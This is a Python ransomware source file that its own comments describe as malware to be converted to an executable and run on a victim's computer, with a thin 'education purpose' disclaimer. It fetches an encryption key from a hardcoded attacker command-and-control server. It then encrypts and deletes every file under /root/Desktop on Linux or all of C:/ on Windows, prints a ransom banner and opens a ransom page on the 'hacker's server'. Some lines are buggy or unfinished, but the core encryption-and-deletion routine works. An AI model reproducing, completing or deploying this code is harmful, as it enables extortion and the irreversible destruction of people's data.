# This the malware code that is actually to be run on the victims coputer 
# conver it to the exe before finally executing on the windows based operating system 


# Malware is only for education purpose and learning/understanding the teqnical picture of the virus development .../
#! usr/bin/python

import sys
import os
import time
##os.system("pip install socket && pip install cryptography") # installing the required python libraries ....
import socket
os.system("pip install cryptography") # installing module in case it is not installed with the python package ... 

from cryptography.fernet import Fernet
os.system("pip install wget")

import wget 
# Iniatilising the socket server   
master_serverIP = "10.0.2.15"  # The Attacker_server ip address to be hardcoded before finally propagating the malware...//

sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)   #  tcp based command and control server controlled by the Attacker/Hacker 
sock.connect(("master_serverIP" , int(sys.argv[1])))   # port is also needed to be hardcoded in the code ..

enter = "Running the malware..."
exit = "Data encrytion Started"
print(sock.recv(2048).decode())
key = sock.recv(2048)

print(key)
sock.send(exit.encode())
sock.close()


# this funcrion is platform dependent as it is a data encryption AES function ...no interfereence with the operating system ... 
def encrypt_all(key , name):
 	#if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        # file extension modification after the file encryption completes in the victim's machine 
        encrypted_file = name + ".encrypted"

        try: 
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)
        	# original file removed by the operating system 
            os.remove(name)

        except:
            print("Operation not completed , due to some failure ")


# os file system traversal for the linux/unix based os 
def filelist_linux():
#  declared mylist[] array to find and store all the desired extension files
# that are to be encrypted by the malware 
    
    # files containing array --->> List crypcrrp 
    #mylist = [".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
    #mylist = [".html"]
    for root, dirs, files in os.walk("/root/Desktop"):
        for file in files:
        	# searching files of extensions given in the list above 
     #       for ext in mylist:    
      #          if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    # calling the function ..//>>
                    encrypt_all(key, ally)



# os file system --->> directory recusive traversal for windows based os .. 
def filelist_windows():

    for root, dirs, files in os.walk("c:/"):
        for file in files:

                    ally = os.path.join(root,file)
                    print(ally)
                    # calling main malware fucntion 
                    encrypt_all(key, ally)


# function for checking the operating system first for the victim before executing the malware accordingly .. 

def OS_platform():
    # importing the platform function from system library ... 
    from sys import platform 
    if platform == "linux" or platform == "linux2":
            # linux os is running 
            # run function for linux file system --->> code ! 
        filelist_linux() # malware in action !!!
        final_action() # alert banner display 

        # REDIRECTING USER TO THE WEB BASED ALERT PAGE TO COLLECT RANSOM
        # AND FOR DATA REVERT BACK PROCEDURE COMPLETION ....
        import webbrowser 
        new=2;
        url ="http://192.168.43.230/ransom.html"; # HACKER'S SERVER IP. 
        webbrowser.open(url, new=new);
        

    elif platform == "darwin":
        # some other x os is running 
        pass # till now for a reason for other os X

    elif platform == "win32":
        # windows os is running here ...
        # here , run code for windows specific os file system ... 
        filelist_windows() # malware in action ..
        final_action() # alert banner display 
        
        import webbrowser 
        new=2;
        url ="http://192.168.43.230/ransom.html";
        webbrowser.open(url, new=new);


 # filelist_linux() # Executing the ransomware ...//::))


def ransom_banner():

    print                               "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!!!!!!1!!!WARNING!!!!!!!!!!!!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX "
    print " "
    print                                                              "YOU ARE INFECTED WITH THE RAMSOMWARE VIRUS!!!! "
    print " "
    print                                             "XXXXXXXXXXX!!All of your Important Data Have been encrypted!!!XXXXXXXXXXXX"
    print " "

    print "Pay the ransom to the given link to recover your encrypted data.../"


def final_action():

    ransom_banner()
    # pay_ransom() # disabled this function temprarily for the sake ..

# ransom payment function gateway tobe developed ; 
#  define the function for collecting ransom and generatinf and verifying the user's password 

#   the end for now--->//

    
